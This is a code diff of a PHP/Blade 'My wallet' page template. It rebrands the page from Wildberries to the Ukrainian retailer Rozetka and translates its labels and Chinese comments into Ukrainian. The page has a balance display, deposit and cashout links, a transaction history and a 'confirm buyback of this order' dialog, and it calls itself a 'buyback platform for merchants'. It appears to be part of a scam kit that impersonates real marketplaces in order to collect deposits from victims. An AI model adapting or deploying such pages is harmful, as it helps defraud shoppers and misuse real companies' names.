@@ -19,11 +19,11 @@
 	</style>
 	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0">
-	<title>Мой кошелек - Wildberries</title>
-	<meta name="keywords" content="Платформа обратного выкупа для российских торговцев">
-	<meta name="description" content="Коллекции женской, мужской и детской одежды, обуви, а также товары для дома и спорта. Информация о доставке и оплате. Таблицы размеров, советы по уходу за вещами.">
+	<title>Мій гаманець - Rozetka</title>
+	<meta name="keywords" content="Платформа зворотного викупу для українських торговців">
+	<meta name="description" content="Колекції жіночого, чоловічого та дитячого одягу, взуття, а також товари для дому та спорту. Інформація про доставку та оплату. Таблиці розмірів, поради по догляду за речами.">
 	<meta name="format-detection" content="telephone=no">
-	<link rel="shortcut icon" type="image/ico" href="https://wbbff.cc/favicon.ico">
+	<link rel="shortcut icon" type="image/ico" href="<?php echo asset("assets/favicon.ico") ?>">
 	<link type="text/css" rel="stylesheet" href="<?php echo asset("assets/style.css") ?>">
 	<script type="text/javascript" src="<?php echo asset("assets/jquery.js") ?>"></script>
 	<script type="text/javascript" src="<?php echo asset("assets/global.js") ?>"></script>
@@ -34,15 +34,15 @@
 <body>
 	<div class="pagetop">
 		<div class="fh"><a href="<?php echo route("profile") ?>"></a></div>
-		<div>Мой кошелек</div>
+		<div>Мій гаманець</div>
 		<!-- <div class="cd"><a href="javascript:top_menu();"></a></div> -->
 		<!-- 
 <div class="top_menu" id="top_menu">
 	<ul>
-	<li><a href="<?php echo route("index") ?>"><i class="top_tb1"></i><span>Главная</span></a></li>
+	<li><a href="<?php echo route("index") ?>"><i class="top_tb1"></i><span>Головна</span></a></li>
 	<li><a href="https://wbbff.cc/index.php/category/list"><i class="top_tb2"></i><span>Каталог</span></a></li>
-	<li><a href="<?php echo route("cart") ?>"><i class="top_tb3"></i><span>Корзина</span></a></li>
-	<li><a href="<?php echo route("profile") ?>"><i class="top_tb4"></i><span>Профиль</span></a></li>
+	<li><a href="<?php echo route("cart") ?>"><i class="top_tb3"></i><span>Кошик</span></a></li>
+	<li><a href="<?php echo route("profile") ?>"><i class="top_tb4"></i><span>Профіль</span></a></li>
 	</ul>
 	<div class="clear"></div>
 </div> -->
@@ -50,16 +50,16 @@
 	<div class="fenhong_box">
 		<div class="zh_jb"><i></i></div>
 		<div class="">баланс</div>
-		<div class="fh_money"><span class="font20">₾</span>0.0</div>
+		<div class="fh_money"><span class="font20">₴</span>0.0</div>
 	</div>
 	<div class="tx_ul">
 		<ul>
-			<li class="side_i9"><a href="<?php echo route("deposit") ?>">Пополнить<span></span><i></i></a></li>
-			<li class="side_i10"><a href="<?php echo route("cashout") ?>">снятие<span></span><i></i></a></li>
+			<li class="side_i9"><a href="<?php echo route("deposit") ?>">Поповнити<span></span><i></i></a></li>
+			<li class="side_i10"><a href="<?php echo route("cashout") ?>">Зняти<span></span><i></i></a></li>
 		</ul>
 	</div>
 	<div class="main">
-		<div class="tx_tt"><i></i>История</div>
+		<div class="tx_tt"><i></i>Історія</div>
 			<div class="jf_box" style="margin-top:0">
 				<ul>
 					@foreach($histories as $history)
@@ -69,7 +69,7 @@
 							<p class="font12">{{ $history->created_at }}</p>
 						</div>
 						<div class="jf_right">
-							<p class="{{ $history->amount > 0 ? 'green' : 'red' }}">{{ $history->amount > 0 ? '+' : '-' }}₾ {{ abs($history->amount) }}</p>
+							<p class="{{ $history->amount > 0 ? 'green' : 'red' }}">{{ $history->amount > 0 ? '+' : '-' }}₴ {{ abs($history->amount) }}</p>
 							<p class="font12">{{ $history->status }}</p>
 						</div>
 					</li>
@@ -111,7 +111,7 @@
 	<script type="text/javascript" src="<?php echo asset("assets/layer.js") ?>"></script>
 	<script type="text/javascript" src="<?php echo asset("assets/app.js") ?>"></script>
 	<script type="text/javascript">
-		//顶部菜单点击
+		//клік верхнього меню
 		function top_menu() {
 			if ($("#top_menu").is(":hidden")) {
 				$("#top_menu").show();
@@ -127,13 +127,13 @@
 	<script>
 		function confirm_huigou(order_id) {
 			layer.open({
-				content: "Определить выкуп этого Заказ？",
-				btn: ["OK", "Отмена"],
+				content: "Визначити викуп цього Замовлення？",
+				btn: ["OK", "Скасувати"],
 				shadeClose: false,
 				yes: function() {
 
 					/*layer.open({
-						content: '你点了确认',
+						content: 'ви натиснули підтвердити',
 						time: 1
 					});*/
 					$.ajax({
